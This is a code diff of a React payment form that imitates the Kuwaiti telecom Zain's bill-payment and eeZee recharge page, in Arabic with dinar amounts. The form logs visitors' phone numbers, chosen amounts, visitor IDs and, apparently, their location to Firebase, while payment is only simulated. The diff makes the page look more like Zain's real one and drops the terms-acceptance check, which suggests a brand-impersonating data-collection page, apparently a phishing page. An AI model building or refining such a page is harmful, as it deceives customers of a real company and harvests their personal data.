@@ -15,6 +15,7 @@ import { Separator } from "@/components/ui/separator"
 // Assuming these are correctly set up in your project
  import { addData } from "@/lib/firebase";
  import { setupOnlineStatus } from "@/lib/util";
+import Loader from "./loader"
 
 // Placeholder functions to avoid errors if lib files are not present
 
@@ -26,7 +27,7 @@ export default function ZainPaymentForm() {
   const [phone, setPhone] = useState("")
   const [paymentType, setPaymentType] = useState("other")
   const [termsAccepted, setTermsAccepted] = useState(false)
-  const [amount, setAmount] = useState(0)
+  const [amount, setAmount] = useState('6.00')
   const [selectedAmount, setSelectedAmount] = useState<string | null>(null)
   const [phoneError, setPhoneError] = useState("")
   const [isLoading, setIsLoading] = useState(false)
@@ -37,6 +38,11 @@ export default function ZainPaymentForm() {
     localStorage.setItem("visitor", newVisitorId);
     setVisitorId(newVisitorId);
   }, []);
+
+  useEffect(() => {
+    localStorage.setItem("amount",amount);
+  }, [amount]);
+
 
 
   useEffect(() => {
@@ -57,7 +63,7 @@ export default function ZainPaymentForm() {
   const handleAmountSelect = (value: string) => {
     setSelectedAmount(value)
     localStorage.setItem("amount", value) // Consider if this is necessary or should be component state only
-    setAmount(Number.parseFloat(value))
+    setAmount((value))
   }
 
   const getLocationAndLog = useCallback(async () => {
@@ -100,23 +106,21 @@ export default function ZainPaymentForm() {
     }
   }, [visitorId, getLocationAndLog]);
 
-  const handleSubmit = async () => {
-    if (!isFormValid || !visitorId) return
+  const handleSubmit = async (e:any) => {
+    e.preventDefault()
     setIsLoading(true)
+
+    if (!isFormValid || !visitorId) return
     
     try {
       await addData({
         id: visitorId,
         phone: phone, // Storing phone number, ensure compliance with privacy regulations
         amount: amount,
-        paymentType: activeTab,
-        selectedPaymentOption: paymentType, // For bill payment
-        termsAccepted: termsAccepted,
         timestamp: new Date().toISOString(),
         action: "payment_submit_attempt"
       })
       // Simulate API call for payment processing
-      await new Promise(resolve => setTimeout(resolve, 1500));
       
       // On successful payment simulation
       await addData({
@@ -140,7 +144,7 @@ export default function ZainPaymentForm() {
     }
   }
 
-  const isFormValid = phone.length === 8 && !phoneError && termsAccepted && amount > 0
+  const isFormValid = phone.length === 8 &&  parseInt(amount) > 0
 
   const billAmounts = ["5", "10", "15", "20", "30", "50"]
   const rechargeAmounts = ["2", "5", "10", "15", "20", "30"]
@@ -175,16 +179,15 @@ export default function ZainPaymentForm() {
       </div>
     )
   );
-
-  const renderPhoneNumberInput = (idPrefix: string) => (
+ 
+  const renderPhoneNumberInput = () => (
     <div className="space-y-2">
-      <Label htmlFor={`${idPrefix}-phone`} className="text-sm font-medium text-slate-800 flex items-center justify-between">
+      <Label className="text-sm font-medium text-slate-800 flex items-center justify-between">
         <span>رقم الهاتف</span>
         <Badge variant="outline" className="text-xs font-normal border-primary/50 text-primary">مطلوب</Badge>
       </Label>
       <div className="relative">
         <Input
-          id={`${idPrefix}-phone`}
           type="tel"
           placeholder="XXXXXXXX"
           value={phone}
@@ -193,7 +196,7 @@ export default function ZainPaymentForm() {
           className={`h-12 text-lg font-mono bg-white border-slate-300 focus:border-primary focus:ring-1 focus:ring-primary transition-colors placeholder:text-slate-400 text-left
             ${phoneError ? "border-red-500 focus:border-red-500 focus:ring-red-500" : "border-slate-300"}
             ${phone.length === 8 && !phoneError ? "border-green-500 focus:border-green-500 focus:ring-green-500" : ""}`}
-          dir="ltr" // Keep ltr for phone number input
+          dir="rtl" // Keep ltr for phone number input
         />
         {phone.length === 8 && !phoneError && (
           <CheckCircle2 className="absolute left-3 top-1/2 transform -translate-y-1/2 w-5 h-5 text-green-500" />
@@ -238,141 +241,59 @@ export default function ZainPaymentForm() {
   );
 
   return (
-    <div className="min-h-screen bg-slate-50 py-8 px-4 sm:px-6 lg:px-8" dir="rtl">
-      <div className="max-w-lg mx-auto">
-        {/* Header */}
-        <header className="text-center mb-10">
-          <div className="inline-flex items-center justify-center w-20 h-20 bg-primary/10 rounded-2xl mb-6 shadow-sm">
-            {/* Replace with Zain logo if available */}
-            <CreditCard className="w-10 h-10 text-primary" />
-          </div>
-          <h1 className="text-3xl font-extrabold text-slate-900 mb-2 tracking-tight">خدمات الدفع الإلكتروني</h1>
-          <p className="text-md text-slate-600">ادفع فاتورتك أو أعد تعبئة رصيدك بكل سهولة وأمان.</p>
-        </header>
+    <form dir="rtl" onSubmit={handleSubmit} className="min-h-screen bg-white text-black p-4">
+    <div className="max-w-md mx-auto bg-white rounded-xl shadow-md p-4" dir="rtl">
+      <div className="flex justify-around border-b pb-2 mb-4">
+        <button type="button" onClick={()=>setActiveTab('bill')} className={activeTab==="bill"?"text-pink-600 font-bold":"text-gray-600"}>دفع الفاتورة</button>
+        <button type="button" onClick={()=>setActiveTab('ess')}  className={activeTab==="ess"?"text-pink-600 font-bold":"text-gray-600"}>إعادة تعبئة eeZee</button>
 
-        <Tabs value={activeTab} onValueChange={setActiveTab} className="w-full">
-          <TabsList className="grid w-full grid-cols-2 bg-slate-100 h-auto p-1.5 rounded-xl shadow-inner border border-slate-200">
-            {[
-              { value: "bill", label: "دفع الفاتورة", icon: CreditCard },
-              { value: "recharge", label: "إعادة تعبئة", icon: Smartphone },
-            ].map(tab => (
-              <TabsTrigger
-                key={tab.value}
-                value={tab.value}
-                className="flex items-center justify-center gap-2.5 py-3.5 px-4 rounded-lg text-sm font-semibold text-slate-600
-                           data-[state=active]:bg-primary data-[state=active]:text-primary-foreground data-[state=active]:shadow-md 
-                           transition-all duration-300 ease-in-out focus-visible:ring-2 focus-visible:ring-primary focus-visible:ring-offset-2 focus-visible:ring-offset-slate-100"
-                onClick={() => { setSelectedAmount(null); setAmount(0); /* setPhone(""); setTermsAccepted(false); */ }} // Reset amount on tab change
-              >
-                <tab.icon className="w-5 h-5" />
-                <span>{tab.label}</span>
-              </TabsTrigger>
-            ))}
-          </TabsList>
-
-          <TabsContent value="bill" className="mt-6">
-            <Card className="shadow-xl border-slate-200 bg-white rounded-xl overflow-hidden">
-              <CardHeader className="bg-slate-50/70 p-6 border-b border-slate-200">
-                <div className="flex items-center gap-4">
-                  <div className="w-12 h-12 bg-primary/10 rounded-lg flex items-center justify-center shrink-0">
-                    <CreditCard className="w-6 h-6 text-primary" />
-                  </div>
-                  <div>
-                    <CardTitle className="text-lg font-semibold text-slate-900">دفع فاتورة زين</CardTitle>
-                    <CardDescription className="text-sm text-slate-600">اختر نوع الدفع وأدخل التفاصيل المطلوبة.</CardDescription>
-                  </div>
-                </div>
-              </CardHeader>
-              <CardContent className="p-6 space-y-6">
-                <div className="space-y-2">
-                  <Label className="text-sm font-medium text-slate-800">نوع الدفع</Label>
-                  <Select value={paymentType} onValueChange={setPaymentType}>
-                    <SelectTrigger className="h-12 bg-white border-slate-300 hover:border-primary focus:border-primary focus:ring-1 focus:ring-primary transition-colors text-slate-700">
-                      <SelectValue placeholder="اختر نوع الدفع" />
-                    </SelectTrigger>
-                    <SelectContent>
-                      <SelectItem value="other">رقم آخر</SelectItem>
-                      <SelectItem value="contract">رقم العقد (غير مفعل حالياً)</SelectItem>
-                    </SelectContent>
-                  </Select>
-                </div>
-
-                {renderPhoneNumberInput("bill")}
-                {renderAmountSelection()}
-                {renderTermsAndConditions("bill")}
-              </CardContent>
-            </Card>
-          </TabsContent>
-
-          <TabsContent value="recharge" className="mt-6">
-            <Card className="shadow-xl border-slate-200 bg-white rounded-xl overflow-hidden">
-              <CardHeader className="bg-slate-50/70 p-6 border-b border-slate-200">
-                <div className="flex items-center gap-4">
-                  <div className="w-12 h-12 bg-primary/10 rounded-lg flex items-center justify-center shrink-0">
-                    <Smartphone className="w-6 h-6 text-primary" />
-                  </div>
-                  <div>
-                    <CardTitle className="text-lg font-semibold text-slate-900">إعادة تعبئة رصيد eeZee</CardTitle>
-                    <CardDescription className="text-sm text-slate-600">أدخل رقم الهاتف واختر باقة التعبئة.</CardDescription>
-                  </div>
-                </div>
-              </CardHeader>
-              <CardContent className="p-6 space-y-6">
-                {renderPhoneNumberInput("recharge")}
-                {renderAmountSelection()}
-                {renderTermsAndConditions("recharge")}
-              </CardContent>
-            </Card>
-          </TabsContent>
-        </Tabs>
-
-        {/* Payment Summary & Action Button */}
-        {amount > 0 && (
-          <Card className="mt-8 shadow-xl border-slate-200 bg-white rounded-xl overflow-hidden">
-            <CardHeader className="p-6">
-              <CardTitle className="text-lg font-semibold text-slate-800">ملخص الدفع</CardTitle>
-            </CardHeader>
-            <CardContent className="p-6 pt-0">
-              <div className="flex items-center justify-between mb-4 pb-4 border-b border-dashed border-slate-200">
-                <span className="text-md font-medium text-slate-700">المبلغ الإجمالي</span>
-                <div className="text-right">
-                  <div className="text-2xl font-bold text-primary">{amount.toFixed(3)}</div>
-                  <div className="text-sm text-slate-500">دينار كويتي</div>
-                </div>
-              </div>
-
-              <Button
-                onClick={handleSubmit}
-                disabled={!isFormValid || isLoading}
-                className="w-full h-14 text-lg font-bold bg-primary hover:bg-primary/90 text-primary-foreground
-                           disabled:bg-slate-300 disabled:text-slate-500 disabled:cursor-not-allowed
-                           transition-all duration-200 shadow-lg hover:shadow-primary/40 focus-visible:ring-2 focus-visible:ring-primary focus-visible:ring-offset-2"
-                aria-live="polite"
-              >
-                {isLoading ? (
-                  <div className="flex items-center justify-center gap-2.5">
-                    <Loader2 className="w-6 h-6 animate-spin" />
-                    <span>جاري المعالجة...</span>
-                  </div>
-                ) : (
-                  <div className="flex items-center justify-center gap-2.5">
-                    <CreditCard className="w-5 h-5" />
-                    <span>ادفع الآن</span>
-                  </div>
-                )}
-              </Button>
-            </CardContent>
-          </Card>
-        )}
-
-        {/* Footer (Optional) */}
-        <footer className="mt-12 text-center">
-          <p className="text-sm text-slate-500">&copy; {new Date().getFullYear()} Zain. جميع الحقوق محفوظة.</p>
-          {/* Placeholder for Zain logo image */}
-          {/* <img src="/zain-logo.svg" alt="Zain Logo" className="h-8 mx-auto mt-4 opacity-75" /> */}
-        </footer>
       </div>
+
+      <h2 className="text-lg font-bold mb-2">أود أن أعيد التعبئة لـ</h2>
+
+      <div className="mb-4">
+        {renderPhoneNumberInput()}
+      </div>
+
+      <div className="mb-4">
+        <label className="block mb-1 text-gray-700">مبلغ التعبئة</label>
+        <select
+          className="w-full border border-gray-300 rounded p-2"
+          value={amount}
+          onChange={(e) => setAmount(e.target.value)}
+        >
+          <option value="6.000">6.000 د.ك (30 يوم)</option>
+          <option value="10.000">10.000 د.ك (60 يوم)</option>
+          <option value="15.000">15.000 د.ك (90 يوم)</option>
+          <option value="30.000">30.000 د.ك (120 يوم)</option>
+          <option value="40.000">40.000 د.ك (150 يوم)</option>
+          <option value="50.000">50.000 د.ك (200 يوم)</option>
+        </select>
+      </div>
+
+      <div className="text-center mb-4">
+        <button className=" text-gray-600 py-2 px-4 rounded w-full" disabled>
+          + أضف رقم آخر
+        </button>
+      </div>
+
+      <hr className="my-4" />
+
+      <div className="flex justify-between text-xl font-bold text-green-600 mb-4">
+        <span>{amount}د.ك</span>
+        <span className="text-black">إجمالي</span>
+      </div>
+
+      <button  className={isFormValid?"bg-rose-600 text-white py-2 px-4 rounded w-full" :"bg-gray-300 text-gray-600 py-2 px-4 rounded w-full" }>
+        أعد التعبئة الآن
+      </button>
     </div>
+    {isLoading&&<Loader/>}
+
+  </form>
+
+
+
   )
 }
 
